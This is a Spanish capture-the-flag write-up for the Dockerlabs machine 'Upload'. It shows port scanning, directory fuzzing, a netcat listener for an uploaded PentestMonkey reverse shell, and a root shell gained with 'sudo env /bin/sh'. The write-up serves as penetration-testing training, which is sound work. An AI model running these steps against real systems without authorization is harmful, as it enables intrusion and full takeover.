# Upload

Plataforma: Dockerlabs
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 4 de diciembre de 2024 21:01
IP: 172.17.0.2

## Recopilación de información

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p-  --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
```

Open port: 80

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

- **Identificación de vulnerabilidades**
    - 80 / HTTP
    
    Whatweb :
    
    ![image.png](<imagenes/image.png>)
    
    Fuzzing : 
    
    ```bash
    gobuster dir -u 172.17.0.2 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x txt,php
    
    ```
    
    ![image.png](<imagenes/image 1.png>)
    

![image.png](<imagenes/image 2.png>)

## Explotación

### Explotación 1

Upload reverse shell PentestMonkey via web

```bash
sudo nc -lvnp 443
```

![image.png](<imagenes/image 3.png>)

### Escalada de privilegios

Buscamos binarios SUID:

```bash
sudo -l
```

![image.png](<imagenes/image 4.png>)

Buscamos en GTFOBins como explotar el binario “env”

```bash
sudo env /bin/sh
```

![image.png](<imagenes/image 5.png>)

## Conclusión

Enumeración básica de la maquina, con un servicio vulnerable. Explotación via File Upload.

Escalada de privilegios senzilla exploando binario ENV